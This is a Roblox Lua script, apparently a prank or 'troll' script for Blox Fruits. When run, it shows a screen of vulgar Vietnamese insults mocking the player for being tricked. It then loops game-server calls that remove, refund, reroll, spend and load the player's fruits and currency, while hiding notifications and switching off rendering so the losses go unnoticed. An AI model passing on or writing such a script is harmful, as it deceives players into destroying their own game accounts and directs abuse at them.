--by tài nhớt

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")

local textLabel = Instance.new("TextLabel")
textLabel.Parent = gui
textLabel.Size = UDim2.new(0.5, 0, 0.2, 0) -- Chiều rộng 50%, chiều cao 20% màn hình
textLabel.Position = UDim2.new(0.25, 0, 0.4, 0) -- Canh giữa
textLabel.BackgroundColor3 = Color3.fromRGB(128, 128, 128) -- Màu xám
textLabel.Text = " ĐỂ T LỪA 2 LẦN NGUUUUU ngáo chó như cặc copy độ mà copy ngu già mà nch mất dạy vô học đéo não chửi ngk mặc dù nó đ làm con mẹ gì óc thì toàn cứt chết mẹ m đi"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Chữ màu trắng
textLabel.TextScaled = true -- Tự động chỉnh kích thước chữ
textLabel.Font = Enum.Font.SourceSansBold -- Font chữ đậm

spawn(function()
    while task.wait() do
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("RemoveFruit","Beli")
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","1")
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","2")
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Reroll","1")
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Reroll","2")
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Black Cape")
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("InfoLeviathan", "2")
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat","PirateGrandBrigade")
    end
end))
function load(fruitname)
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", fruitname)
end    
local character = game.Players.LocalPlayer.Character
spawn(function()
    while task.wait() do
       load("Dragon-Dragon")
       load("Kitsune-Kitsune")
       load("Yeti-Yeti")
       load("Leopard-Leopard")
       load("Spirit-Spirit")
       load("Gas-Gas")
       load("Control-Control")
       load("Venom-Venom")
       load("Shadow-Shadow")
       load("Dough-Dough")
       load("T-rex-T-rex")
       load("Mammoth-Mammoth")
       load("Gravity-Gravity")
       load("Blizzard-Blizzard")
       load("Pain-Pain")
       load("Rumble-Rumble")
       load("Portal-Portal")
       load("Phoenix-Phoenix")
       load("Sound-Sound")
       load("Ghost-Ghost")
       load("Love-Love")
  end
end)
RemoveNotify = true
spawn(function()
        while wait() do
            if RemoveNotify then
                game.Players.LocalPlayer.PlayerGui.Notifications.Enabled = false
            else
                game.Players.LocalPlayer.PlayerGui.Notifications.Enabled = true
            end
        end
    end)
Buoi = true
spawn(function() while task.wait() do if Buoi then game:GetService("RunService"):Set3dRenderingEnabled(false) else game:GetService("RunService"):Set3dRenderingEnabled(true) end end end)
